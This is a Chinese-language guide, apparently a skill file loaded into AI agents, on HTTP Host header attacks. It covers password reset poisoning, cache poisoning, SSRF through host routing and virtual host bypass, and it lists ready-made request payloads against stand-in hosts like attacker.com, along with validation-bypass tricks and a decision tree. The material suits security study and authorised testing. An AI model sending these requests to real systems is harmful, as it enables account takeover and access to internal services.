# 技能：HTTP 主机头攻击 — 注入与路由滥用

> **AI 加载指令**：涵盖主机头注入用于密码重置中毒、缓存中毒、通过路由的 SSRF（服务器端请求伪造）以及虚拟主机绕过。包括绕过主机验证和框架特定行为的技巧。基础模型常遗漏双主机头技巧、绝对URI覆盖和连接状态攻击。

## 0. 相关路由

- [web-cache-deception](../web-cache-deception/SKILL.md) 当主机注入与缓存行为结合时
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) 当主机头将请求路由到内部服务时
- [open-redirect](../open-redirect/SKILL.md) 当主机注入导致重定向到攻击者域时
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) 当主机操作有助于绕过 WAF 路由时
- [request-smuggling](../request-smuggling/SKILL.md) 当走私使主机头操作能够绕过前端验证时
- [subdomain-takeover](../subdomain-takeover/SKILL.md) 当主机路由暴露可通过子域名解析的内部 vhosts 时

---

## 1. 攻击面

主机头由 Web 应用和基础设施用于：

| 使用场景 | 利用方式 |
|---|---|
| URL 生成（密码重置链接、邮件链接） | 注入攻击者域 → 用户点击链接到攻击者 |
| 虚拟主机路由 | 模拟主机 → 访问内部/管理 vhost |
| 缓存键组件 | 注入不同主机 → 对所有用户中毒缓存 |
| 反向代理路由 | 主机决定后端 → SSRF 到内部服务 |
| 访问控制决策 | 基于主机的 ACL 可能被绕过 |
| 规范 URL / SEO 重定向 | 主机注入 → 开放重定向 |

---

## 2. 密码重置中毒

最常见且影响最大的主机头攻击。

### 工作原理

```
1. 攻击者请求 victim@target.com 的密码重置
2. 攻击者修改重置请求中的主机头：
   POST /forgot-password HTTP/1.1
   Host: attacker.com    ← 注入
   
   email=victim@target.com

3. 服务器使用主机头值生成重置链接：
   "点击此处重置：https://attacker.com/reset?token=SECRET_TOKEN"

4. 受害者收到邮件，点击链接 → 令牌发送给攻击者
5. 攻击者使用令牌在真实的 target.com 上重置密码
```

### 测试

```http
POST /forgot-password HTTP/1.1
Host: attacker-collaborator.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

检查 Burp Collaborator 接收到的包含重置令牌的 HTTP 请求。

### 变体

- 某些应用连接：`Host: target.com.attacker.com` → 链接变为 `https://target.com.attacker.com/reset?token=xxx`
- 某些应用仅使用端口部分：`Host: target.com:@attacker.com` → 在某些 URL 解析器中解析为 `attacker.com`

---

## 3. 通过主机进行缓存中毒

```
1. 攻击者发送：
   GET / HTTP/1.1
   Host: attacker.com

2. 如果 URL 路径上有缓存键但主机头没有：
   → 响应使用 attacker.com 缓存生成的链接/内容

3. 后续用户请求 GET / 接收中毒响应
   → 链接指向 attacker.com，脚本从 attacker.com 加载
```

**关键要求**：缓存不应在缓存键中包含主机头，但应用必须在响应体中使用主机头。

通过发送两个具有不同主机值的请求并检查第二个请求是否在响应中返回第一个请求的主机头来测试。

---

## 4. 通过主机路由的 SSRF

当反向代理使用主机头路由到后端时：

```
GET /api/internal HTTP/1.1
Host: internal-admin-panel.local

→ 反向代理将请求路由到 internal-admin-panel.local
→ 攻击者访问内部服务
```

常见于：
- 基于 `$host` 的 Nginx `proxy_pass`
- 使用虚拟主机路由的 Apache `ProxyPass`
- Kubernetes Ingress 控制器
- 云负载均衡器

---

## 5. 虚拟主机绕过

许多服务器通过虚拟主机在同一 IP 上托管多个应用：

```
目标：  Host: www.target.com  → 公开站点
隐藏：  Host: admin.target.com → 管理面板（不在公共 DNS 中）
隐藏：  Host: staging.target.com → 测试环境
隐藏：  Host: localhost → 服务器状态页面
```

### 发现

```
1. 使用常见虚拟主机名称暴力破解主机头：
   ffuf -u http://TARGET_IP -H "Host: FUZZ.target.com" -w vhosts.txt

2. 尝试特殊值：
   Host: localhost
   Host: 127.0.0.1
   Host: admin
   Host: internal
   Host: intranet

3. 比较响应大小/内容以识别不同的 vhosts
```

---

## 6. 当主机被验证时的绕过技巧

### 6.1 覆盖头部

许多框架/代理信任这些头部而不是主机头：

| 头部 | 信任它的框架 |
|---|---|
| `X-Forwarded-Host` | Symfony, Laravel, Django（当 `USE_X_FORWARDED_HOST=True` 时），Rails（在代理后面） |
| `X-Host` | 某些自定义代理配置 |
| `X-Original-URL` | 使用 URL Rewrite 模块的 IIS |
| `X-Rewrite-URL` | 使用 URL Rewrite 模块的 IIS |
| `Forwarded: host=attacker.com` | RFC 7239 兼容代理 |
| `X-Forwarded-Server` | Apache mod_proxy |

同时测试所有这些：

```http
GET /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Original-URL: /forgot-password
Forwarded: host=attacker.com
```

### 6.2 请求行中的绝对 URL

```http
GET http://attacker.com/path HTTP/1.1
Host: target.com
```

根据 HTTP/1.1 规范（RFC 7230）：如果请求行包含绝对 URI，则应忽略 Host 头。某些服务器遵循此规范，某些不遵循——代理和后端之间的不匹配产生了漏洞。

### 6.3 双主机头

```http
GET /path HTTP/1.1
Host: target.com
Host: attacker.com
```

行为各异：
- 某些代理验证第一个 Host，应用使用第二个
- 某些服务器连接：`target.com, attacker.com`
- RFC 说：如果两者不同，则返回 400。几乎没有任何服务器这样做。漏洞在于代理和应用之间的不匹配。

### 6.4 带端口/凭证的主机

```http
Host: target.com:@attacker.com
Host: target.com:evil.com
Host: target.com#@attacker.com
Host: attacker.com%23@target.com
```

URL 解析器在存在凭证（@）或片段（#）时可能以不同的方式提取“主机”部分。

### 6.5 尾随点

```http
Host: target.com.
```

DNS 将 `target.com.` 和 `target.com` 视为相同（尾随点 = FQDN）。但主机验证可能不会删除尾随点 → `target.com.` ≠ `target.com` 在字符串比较中 → 绕过白名单。

### 6.6 Tab/空格注入

```http
Host: target.com\tattacker.com
Host: target.com attacker.com
```

某些解析器在空格处分割；服务器可能使用 `attacker.com` 部分，而验证检查 `target.com` 部分。

### 6.7 包裹/嵌套值

```http
Host: "attacker.com"
Host: <attacker.com>
```

引号或括号内的值可能被应用删除，但未被验证器删除。

---

## 7. 框架特定行为

| 框架 | 主机源 | 陷阱 |
|---|---|---|
| **PHP** | `$_SERVER['HTTP_HOST']`（原始头部，可直接注入） | `SERVER_NAME` 仅在 `UseCanonicalName On` 时更安全 |
| **Django** | `HttpRequest.get_host()` 首先检查 X-Forwarded-Host（如果启用） | `USE_X_FORWARDED_HOST=True` 绕过 `ALLOWED_HOSTS` |
| **Rails** | 从主机头获取 `request.host`；信任代理后面的 `X-Forwarded-Host` | Rails 6+ `HostAuthorization` 中介程序缓解 |
| **Node/Express** | `req.hostname` / `req.headers.host`；使用 `trust proxy` 时使用 X-Forwarded-Host | 没有内置主机验证 |

---

## 8. 连接状态攻击

利用 HTTP 保持活动的复杂变体：

```
连接 1：
  请求 1: GET / HTTP/1.1    ← 有效主机：target.com
              Host: target.com     → 代理验证，转发，保持连接打开

  请求 2: GET /admin HTTP/1.1  ← 坏主机在同一连接上
              Host: evil.com       → 某些代理在后续请求中跳过验证
                                     （它们在第一次请求时验证了连接）
```

这适用于仅对保持活动连接的第一条请求执行主机验证的代理。

### 测试

```
1. 使用 Burp Repeater 并设置 "Connection: keep-alive"
2. 首先发送正常请求
3. 在同一连接上发送具有操作主机头的请求
4. 检查第二条请求是否被不同处理
```

---

## 9. 主机头攻击决策树

```
应用在响应/行为中使用主机头？
│
├── 测试直接主机头注入
│   ├── 将主机头更改为攻击者域 → 反射在响应中？
│   │   ├── 是 → 检查影响：
│   │   │   ├── 在密码重置邮件中？ → 密码重置中毒
│   │   │   ├── 在缓存响应中？ → 缓存中毒
│   │   │   ├── 在重定向中？ → 开放重定向
│   │   │   └── 在脚本/链接 URL 中？ → 通过主机 XSS
│   │   └── 否（400/403/不同响应）→ 主机被验证
│   │
│   └── 主机被验证？尝试绕过：
│       ├── X-Forwarded-Host 头部
│       ├── X-Host / X-Original-URL / Forwarded 头部
│       ├── 请求行中的绝对 URL
│       ├── 双主机头
│       ├── Host: target.com:@attacker.com（URL 解析器混淆）
│       ├── Host: target.com.（尾随点）
│       ├── Tab/空格注入在主机值中
│       └── 连接状态攻击（有效第一条请求，坏第二条）
│
├── 测试虚拟主机枚举
│   ├── 对目标 IP 暴力破解主机值
│   ├── 尝试：localhost, admin, staging, internal, intranet
│   └── 比较不同主机值下的响应大小
│
├── 测试通过主机路由的 SSRF
│   ├── Host: 127.0.0.1 → 内部服务？
│   ├── Host: internal-hostname.local → 内部路由？
│   └── Host: 169.254.169.254 → 云元数据？
│
└── 未发现基于主机的行为
    └── 检查应用是否在服务器端操作中使用主机
        (邮件生成，webhook URL，API 回调)
```

---

## 10. 技巧笔记 — AI 模型遗漏的内容

1. **密码重置中毒不需要受害者登录** — 你请求重置，受害者只需点击链接。令牌到达你的服务器。
2. **X-Forwarded-Host 是最常遗漏的绕过方式**：大多数主机验证检查 `Host` 头，但框架在代理后面时默默偏好 `X-Forwarded-Host`。
3. **双主机头是协议有效但行为未定义**：RFC 说拒绝并返回 400，但几乎没有任何服务器这样做。漏洞在于代理和应用之间的不匹配。
4. **绝对 URI 覆盖主机根据 RFC**：`GET http://evil.com/path HTTP/1.1\nHost: target.com` — 规范说使用请求行 URI。但并非所有实现都同意。
5. **通过主机进行缓存中毒要求缓存不将主机包含在键中**：大多数 CDN 将主机包含在缓存键中。但自定义 Varnish/Nginx 缓存可能不包含。也测试使用 `X-Forwarded-Host` 作为缓存键的不同iator。
6. **连接状态攻击很少被测试**：自动扫描器不测试保持活动行为。通过 Burp Repeater 的连接重用进行手动测试至关重要。
7. **DNS 重绑定 + 主机攻击**：如果你控制 DNS，将你的域指向目标的 IP → 你的域解析到他们的服务器 → 主机头说你的域，但请求击中他们的服务器。适用于绕过基于 IP 的访问控制。
